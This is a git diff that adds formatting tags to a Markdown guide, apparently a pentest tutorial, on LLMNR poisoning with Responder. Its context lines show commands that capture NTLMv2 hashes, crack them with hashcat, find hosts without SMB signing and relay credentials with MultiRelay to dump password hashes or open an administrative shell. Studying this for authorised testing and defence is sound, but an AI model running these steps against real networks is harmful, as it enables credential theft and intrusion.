@@ -76,6 +76,7 @@ Options:
   --disable-ess         Force ESS downgrade. Default: False
   -v, --verbose         Increase verbosity.
 ```
+{: .nolineno }
 
 # Instructions
 
@@ -87,6 +88,7 @@ Execute the below command on the attacker machine. Ensure that the `-I` switch i
 # Running the listener will wait for a host to make a request
 sudo responder -I ens33 -wd
 ```
+{: .nolineno }
 
 Once a set of NTLMv2 credentials have been collection, the password can be attempted to be cracked.
 
@@ -97,6 +99,7 @@ With the previously obtained NTLMv2 credential hash collected and saved to a tex
 ```bash
 hashcat -m 5600 -a 0 /PATH/TO/DUMP.txt /usr/share/wordlists/rockyou.txt 
 ```
+{: .nolineno }
 
 ## Using Responder-Finger and Responder-MultiRelay
 
@@ -116,18 +119,21 @@ This will require three hosts; the attacker, the requesting LLMNR victim, and th
     ```bash
     sudo responder -I ens33 -wd
     ```
+    {: .nolineno }
 
 3. Identify hosts on the target network that have SMB signing disabled, the `-i` switch requires the subnet to search. Once the results are returned, identify any hosts that return `SMB signing: False`. If none are returned, this method will not work and NTLMv2 credentials will need to be cracked instead.
 
     ```bash
     sudo responder-RunFinger.py -i 10.10.10.1/24
     ```
+    {: .nolineno }
 
 4. Start the MultiRelay to relay the NTLMv2 credentials to any target host identified in step 3. In this example, `10.10.10.10` was identified to have SMB signing disabled and is therefore used as the target `-t`. The `-d` switch will instruct the MultiRelay tool to dump the local password hashes. The `-d` switch can be omitted which will instead return an administrative shell to the target machine.
 
     ```bash
     sudo responder-MultiRelay.py -t 10.10.10.10 -u ALL -d
     ```
+    {: .nolineno }
 
 5. If the `-d` switch was omitted in step 4, an interactive shell will be returned allowed the following commands.
 
